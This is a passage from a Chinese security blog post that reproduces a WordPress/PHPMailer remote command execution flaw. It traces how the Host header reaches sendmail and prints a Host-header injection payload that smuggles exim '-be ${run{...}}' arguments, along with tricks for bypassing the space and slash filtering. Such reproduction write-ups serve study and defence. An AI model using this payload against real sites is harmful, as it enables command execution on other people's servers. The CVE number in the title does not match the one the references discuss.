class="hljs-variable">$phpmailer</span>-&gt;<span class="hljs-title function_ invoke__">setFrom</span>( <span class="hljs-variable">$from_email</span>, <span class="hljs-variable">$from_name</span> );<br></code></pre></td></tr></tbody></table></figure>
<p>根据代码可以看出wordpress基于<code>$_SERVER['SERVER_NAME']</code>来构造<code>$from_email</code>发送邮件的域，前面拼接上<code>wordpress@</code></p>
<p><code>$_SERVER['SERVER_NAME']</code>参数是通过请求头<code>Host</code>字段传入，并且这里只是简单的使用<code>substr</code>去掉了前面的<code>www.</code>，没有任何过滤措施。</p>
<p>在docker中添加a.php代码来查看<code>$_SERVER['SERVER_NAME']</code>的值</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>])){<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>];<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"no value"</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>在下图中看到就是Host字段的值</p>
<p>![image-20230829160821813](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829160821813.png)</p>
<p>接着跟进<code>setFrom</code>函数，定位到<code>wp-includes/class-phpmailer.php</code>，发现其用到了PHPMailer组件</p>
<p><code>setFrom</code>函数如下，这个函数对数据进行校验，没问题的话设置Sender变量为address变量的值</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setFrom</span>(<span class="hljs-params"><span class="hljs-variable">$address</span>, <span class="hljs-variable">$name</span> = <span class="hljs-string">''</span>, <span class="hljs-variable">$auto</span> = <span class="hljs-literal">true</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$address</span>);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[\r\n]+/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$name</span>)); <span class="hljs-comment">//Strip breaks and trim</span><br>        <span class="hljs-comment">// Don't validate now addresses with IDN. Will be done in send().</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$address</span>, <span class="hljs-string">'@'</span>)) === <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span><br>            (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">has8bitChars</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$address</span>, ++<span class="hljs-variable">$pos</span>)) <span class="hljs-keyword">or</span> !<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">idnSupported</span>()) <span class="hljs-keyword">and</span><br>            !<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validateAddress</span>(<span class="hljs-variable">$address</span>)) {<br>            <span class="hljs-variable">$error_message</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">'invalid_address'</span>) . <span class="hljs-variable">$address</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setError</span>(<span class="hljs-variable">$error_message</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">edebug</span>(<span class="hljs-variable">$error_message</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;exceptions) {<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phpmailerException</span>(<span class="hljs-variable">$error_message</span>);<br>            }<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        }<br>        <span class="hljs-variable language_">$this</span>-&gt;From = <span class="hljs-variable">$address</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;FromName = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auto</span>) {<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;Sender)) {<br>                <span class="hljs-variable language_">$this</span>-&gt;Sender = <span class="hljs-variable">$address</span>;<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>其中<code>validateAddress()</code>函数在同文件下，函数前半部分如下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$patternselect</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$patternselect</span> == <span class="hljs-string">'auto'</span>) {<br>            <span class="hljs-comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span><br>            <span class="hljs-comment">//Constant was added in PHP 5.2.4</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">'PCRE_VERSION'</span>)) {<br>                <span class="hljs-comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PCRE_VERSION, <span class="hljs-string">'8.0.3'</span>) &gt;= <span class="hljs-number">0</span>) {<br>                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre8'</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre'</span>;<br>                }<br>            } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'extension_loaded'</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">'pcre'</span>)) {<br>                <span class="hljs-comment">//Fall back to older PCRE</span><br>                <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'pcre'</span>;<br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="hljs-string">'5.2.0'</span>) &gt;= <span class="hljs-number">0</span>) {<br>                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'php'</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    <span class="hljs-variable">$patternselect</span> = <span class="hljs-string">'noregex'</span>;<br>                }<br>            }<br>        }<br></code></pre></td></tr></tbody></table></figure>
<p>经过测试发现<code>$patternselect</code>变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$patternselect</span>) {<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">'pcre8'</span>:<br>              ...<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">'pcre'</span>:<br>              ...<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">'html5'</span>:<br>              ...<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">'noregex'</span>:<br>		...<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">'php'</span>:<br>          <span class="hljs-keyword">default</span>:<br>              ...<br>      }<br></code></pre></td></tr></tbody></table></figure>
<p>pcre8的代码注释</p>
<blockquote>
<p>Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</p>
</blockquote>
<p>基于php内置的邮箱验证的基础上做的修改</p>
<blockquote>
<p><code>php</code> Use PHP built-in FILTER_VALIDATE_EMAIL;</p>
</blockquote>
<p>查阅php官网</p>
<p>![image-20221115091819538.png](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/1668523449643126528.png)</p>
<p>这个验证方式允许使用括号或双引号使邮箱地址包含空格，因此在Hosts字段构造的发件人的邮箱可以是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">target(any -froot@localhost -be ${run{$payload}} null)@qq.com<br></code></pre></td></tr></tbody></table></figure>
<p>经过验证和过滤之后的函数调用</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phpmailer</span><br>=&gt;<span class="hljs-title function_ invoke__">Send</span>()		wp-includes/pluggable.php<span class="hljs-comment">#471</span><br>=&gt;<span class="hljs-title function_ invoke__">postSend</span>() 	wp-includes/<span class="hljs-class"><span class="hljs-keyword">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1125</span><br><span class="hljs-class">=&gt;<span class="hljs-title">mailSend</span>()	<span class="hljs-title">wp</span>-<span class="hljs-title">includes</span>/<span class="hljs-title">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1247</span><br><span class="hljs-class">=&gt;<span class="hljs-title">mailPassthru</span>()	<span class="hljs-title">wp</span>-<span class="hljs-title">includes</span>/<span class="hljs-title">class</span>-<span class="hljs-title">phpmailer</span>.<span class="hljs-title">php</span>#1368</span><br></code></pre></td></tr></tbody></table></figure>
<p>将payload传入到<code>mailPassthru()</code>函数中，函数代码如下</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">function</span> <span class="hljs-title function_">mailPassthru</span>(<span class="hljs-params">$to, $subject, $body, $header, $params</span>)<br>   {<br>       <span class="hljs-comment">//Check overloading of mail function to avoid double-encoding</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ini_get</span>(<span class="hljs-string">'mbstring.func_overload'</span>) &amp; <span class="hljs-number">1</span>) {<br>           $subject = $this-&gt;<span class="hljs-title function_">secureHeader</span>($subject);<br>       } <span class="hljs-keyword">else</span> {<br>           $subject = $this-&gt;<span class="hljs-title function_">encodeHeader</span>($this-&gt;<span class="hljs-title function_">secureHeader</span>($subject));<br>       }<br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ini_get</span>(<span class="hljs-string">'safe_mode'</span>) || !($this-&gt;<span class="hljs-title class_">UseSendmailOptions</span>)) {<br>           $result = @<span class="hljs-title function_">mail</span>($to, $subject, $body, $header);<br>       } <span class="hljs-keyword">else</span> {<br>           $result = @<span class="hljs-title function_">mail</span>($to, $subject, $body, $header, $params);<br>       }<br>       <span class="hljs-keyword">return</span> $result;<br>   }	<br></code></pre></td></tr></tbody></table></figure>
<p>由于没有开启安全模式，因此调用的是<code>$result = @mail($to, $subject, $body, $header, $params);</code></p>
<p><code>@mail</code>是调用原生的<code>mail()</code>，在<code>/wp-includes/class-phpmailer.php</code>中定义</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Which method to use to send mail.</span><br><span class="hljs-comment">    * Options: "mail", "sendmail", or "smtp".</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@var</span> <span class="hljs-variable">string</span></span><br><span class="hljs-comment">    */</span><br>   public $Mailer = <span class="hljs-string">'mail'</span>;	<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * The path to the sendmail program.</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@var</span> <span class="hljs-variable">string</span></span><br><span class="hljs-comment">    */</span><br>   public $Sendmail = <span class="hljs-string">'/usr/sbin/sendmail'</span>;<br></code></pre></td></tr></tbody></table></figure>
<p>查阅php手册</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mail</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span>,<br>    <span class="hljs-keyword">array</span>|<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> = [],<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_params</span> = <span class="hljs-string">""</span><br>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></tbody></table></figure>
<p>对第五个参数有如下描述</p>
<blockquote>
<p>The <code>additional_params</code> parameter can be used to pass  additional flags as command line options to the program configured to be used when sending mail, as defined by the <code>sendmail_path</code> configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the <code>-f</code> sendmail option.</p>
<p>This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters.  For security reasons, it is recommended for the user to sanitize this  parameter to avoid adding unwanted parameters to the shell command.</p>
<p>‘additional_params’参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，如’  sendmail_path ‘配置设置所定义的那样。例如，当使用带有’-f’  sendmail选项的sendmail时，可以使用它来设置信封发送者地址。</p>
<p>该参数通过escapeshellcmd()在内部转义，以防止命令执行。escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。</p>
</blockquote>
<p>实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code></p>
<p>mail() 执行后，会执行这样的指令 <code>sendmail -t -i -fwordpress@过滤后的数据包头中的Host字段值</code></p>
<p>另外<code>sendmail</code>符号链接到<code>exim4</code>，<code>exim4</code>的<code>-be</code>参数能开启字符串扩展测试模式，允许提取一些变量数据</p>
<p><code>$tod_log</code>返回系统时间，<code>$spool_directory</code>返回路径值<code>/var/spool/exim4</code>，因此可以用<code>${substr{10}{1}{$tod_log}}</code>代替空格、<code>${substr{0}{1}{$spool_directory}}</code>代替斜杠来绕过<code>-be</code>后面参数中空格和斜杠，以及<code>run</code>可以运行程序</p>
<p>因此上面提到的payload</p>
<p>因此上面提到的payload</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">target</span>(any -froot@localhost -be ${run{$payload}} <span class="hljs-literal">null</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>最后变成</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">sendmail -t -i -fwordpress@<span class="hljs-title function_">target</span>(any -froot@localhost -be ${run{$payload}} <span class="hljs-literal">null</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>这样就可以执行run中的命令</p>
<p>如果直接在命令行里使用，需要给run加引号</p>
<p>![image-20230829161640747](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829161640747.png)</p>
<h2 id="0x07-参考文章">0x07 参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/128461257">wordpress 4.6任意命令执行漏洞（PwnScriptum）复现</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2301">WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)复现分析</a></p>
<p>[<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">WordPress 4.6 任意命令执行漏洞 (PwnScriptum)</a>](<a target="_blank" rel="noopener" href="https://wuxiuo.com/archives/83">https://wuxiuo.com/archives/83</a>)</p>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/383372">深入分析WordPress4.6(PHPMailer)命令执行漏洞(CVE-2016-10033)</a></p>
<p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/wordpress/pwnscriptum/">Wordpress 4.6 远程代码执行漏洞（PwnScriptum）</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/">http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CVE/">
                                    <span class="chip bg-color">CVE</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/08/30/moectf-2023-wp/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="MoeCTF 2023 - 持续更新">
                        
                        <span class="card-title">MoeCTF 2023 - 持续更新</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/08/24/easy-web/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="攻防世界-easy_web">
                        
                        <span class="card-title">攻防世界-easy_web</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-24
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
                                    攻防世界
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
